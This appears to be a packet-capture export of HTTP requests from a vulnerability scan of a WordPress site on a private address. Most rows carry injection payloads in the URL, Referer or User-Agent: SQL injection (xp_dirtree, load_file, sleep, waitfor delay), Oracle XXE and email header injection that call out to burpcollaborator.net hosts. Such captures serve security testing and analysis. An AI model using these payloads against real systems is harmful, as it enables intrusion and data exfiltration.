http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/xmlrpc.php?rsd%7d%7djgx2z'%2f%22%3ck6xq0		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/xmlrpc.php?rsd%7d%7djgx2z'%2f%22%3ck6xq0
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cgqa8ysn5cnpat2v34fz55d1zvq1ophd84wyjo7d.burpcollab'%2b'orator.net%5cjqp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cgqa8ysn5cnpat2v34fz55d1zvq1ophd84wyjo7d.burpcollab'%2b'orator.net%5cjqp'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20zbicu%20SYSTEM%20%22http%3a%2f%2f77czfj4wte61atcul6gwm4iqchif6gukie54tt.burpcollab'%7c%7c'orator.net%2f%22%3e%25zbicu%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20zbicu%20SYSTEM%20%22http%3a%2f%2f77czfj4wte61atcul6gwm4iqchif6gukie54tt.burpcollab'%7c%7c'orator.net%2f%22%3e%25zbicu%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/);declare @q varchar(99);set @q='\\01zs9cypn70u4m6nfzapgxcj6ac803ougib52tr.burpcollab'+'orator.net\iid'; exec master.dbo.xp_dirtree @q;-- 	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%20into%20outfile%20'%5c%5c%5c%5cl7tdfx4ats6fa7c8lkgamii4cvit6kubyzsmia7.burpcollaborator.net%5c%5cpde'%3b%20--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%20into%20outfile%20'%5c%5c%5c%5cl7tdfx4ats6fa7c8lkgamii4cvit6kubyzsmia7.burpcollaborator.net%5c%5cpde'%3b%20--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/');declare @q varchar(99);set @q='\\g2j8asz5on1a5273gfb5hddz7qdo1jpaiydl49t.burpcollab'+'orator.net\npo'; exec master.dbo.xp_dirtree @q;-- 	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ckwkc4wt9irvez617aj59bh731u7svljcb05nvbk.burpcollab'%2b'orator.net%5chbx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5ckwkc4wt9irvez617aj59bh731u7svljcb05nvbk.burpcollab'%2b'orator.net%5chbx'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1'=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9&1%3e%0d%0aBCC%3aw1yo98yln30q4i6jfvalgtcf66c401otihc42sr@burpcollaborator.net%0d%0ahoa%3a%20f=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9&1%3e%0d%0aBCC%3aw1yo98yln30q4i6jfvalgtcf66c401otihc42sr@burpcollaborator.net%0d%0ahoa%3a%20f=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														(select load_file('\\\\t5zld52ir04n8fagjseikqgca3g14wsnubpygm5.burpcollaborator.net\\bzc'))	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&(select*from(select(sleep(20)))a)=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&(select*from(select(sleep(20)))a)=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5coumg20rdgvtixazb8n3d9l57zy5wtxho7c1zrng.burpcollab'%2b'orator.net%5cvsg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5coumg20rdgvtixazb8n3d9l57zy5wtxho7c1zrng.burpcollab'%2b'orator.net%5cvsg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % glvld SYSTEM "http://5z5x7hwulcyz2r4sd48ue2ao4fadyamda8xyln.burpcollab'||'orator.net/">%glvld;]>'),'/l') from dual)				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cy65qea3ns55s9kblkxfnlvhhb8h65ztqmeg16pv.burpcollab'%2b'orator.net%5cxbj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cy65qea3ns55s9kblkxfnlvhhb8h65ztqmeg16pv.burpcollab'%2b'orator.net%5cxbj'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % glvld SYSTEM "http://eyg66qv3klx81031cd73db9x3o9mxjln9iw8kx.burpcollab'||'orator.net/">%glvld;]>'),'/l') from dual)||'				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%2b(select*from(select(sleep(20)))a)%2b=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%2b(select*from(select(sleep(20)))a)%2b=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/'+(select load_file('\\\\143tcd1qq83v7n9oi0dqjyfk9bf934rvujp6gu5.burpcollaborator.net\\zgz'))+'	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/'	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36;declare @q varchar(99);set @q='\\l7tdfx4ats6fa7c8lkgamii4cvit6quhk5fs5gu.burpcollab'+'orator.net\kmt'; exec master.dbo.xp_dirtree @q;-- 				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%20and%20(select*from(select(sleep(20)))a)--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%20and%20(select*from(select(sleep(20)))a)--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c57axfh4utc6zarcsl4gum2iocfid6eu5ltfg54u.burpcollab'%2b'orator.net%5cslb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c57axfh4utc6zarcsl4gum2iocfid6eu5ltfg54u.burpcollab'%2b'orator.net%5cslb'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?(select%20load_file('%5c%5c%5c%5cwbboj88lx3aqeigjpvklqtmfg6m4axyo0cuzkn9.burpcollaborator.net%5c%5cruc'))=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?(select%20load_file('%5c%5c%5c%5cwbboj88lx3aqeigjpvklqtmfg6m4axyo0cuzkn9.burpcollaborator.net%5c%5cruc'))=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/'(select*from(select(sleep(20)))a)'	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/xmlrpc.php?rsd(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20grxmn%20SYSTEM%20%22http%3a%2f%2fdvc53ps2hku7yz009c42aa6w0n6lukin6et4ht.burpcollab'%7c%7c'orator.net%2f%22%3e%25grxmn%3b]%3e')%2c'%2fl')%20from%20dual)		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/xmlrpc.php?rsd(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20grxmn%20SYSTEM%20%22http%3a%2f%2fdvc53ps2hku7yz009c42aa6w0n6lukin6et4ht.burpcollab'%7c%7c'orator.net%2f%22%3e%25grxmn%3b]%3e')%2c'%2fl')%20from%20dual)
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36';declare @q varchar(99);set @q='\\jj6brvg85qidm5o6xis8ygu2oturio6fx3sqie7.burpcollab'+'orator.net\ugw'; exec master.dbo.xp_dirtree @q;-- 				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%20waitfor%20delay'0%3a0%3a20'--=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/style.css?ver=1.0&1%20waitfor%20delay'0%3a0%3a20'--=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c2z2u7ewrl9yw2o4pd18rezal4caaybm2eq8dy1n.burpcollab'%2b'orator.net%5cxao'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Italic.ttf.woff2?1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c2z2u7ewrl9yw2o4pd18rezal4caaybm2eq8dy1n.burpcollab'%2b'orator.net%5cxao'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104														https://example.com/'+(select*from(select(sleep(20)))a)+'	1	http://192.168.1.104/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-includes/blocks/navigation/view.min.js?ver=3776ea67846b3bb10fe8f7cdd486b0ba
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-includes/blocks/navigation/style.min.css?ver=5.9		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36);declare @q varchar(99);set @q='\\d9n5hp62vk87cze0nci2oakwenkl8iw9oxjk98y.burpcollab'+'orator.net\cdi'; exec master.dbo.xp_dirtree @q;-- 				/web/wp-includes/blocks/navigation/style.min.css?ver=5.9
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9	gzip, deflate	en-US,en-GB;q=0.9,en;q=0.8									max-age=0						close										192.168.1.104															1	http://192.168.1.104/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1'%2b(select%20load_file('%5c%5c%5c%5cisea0up7eprcv4x56h177f31xs3qrjfaiycl29r.burpcollaborator.net%5c%5cujm'))%2b'=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36				/web/wp-content/themes/twentytwentytwo/assets/fonts/SourceSerif4Variable-Roman.ttf.woff2?1'%2b(select%20load_file('%5c%5c%5c%5cisea0up7eprcv4x56h177f31xs3qrjfaiycl29r.burpcollaborator.net%5c%5cujm'))%2b'=1
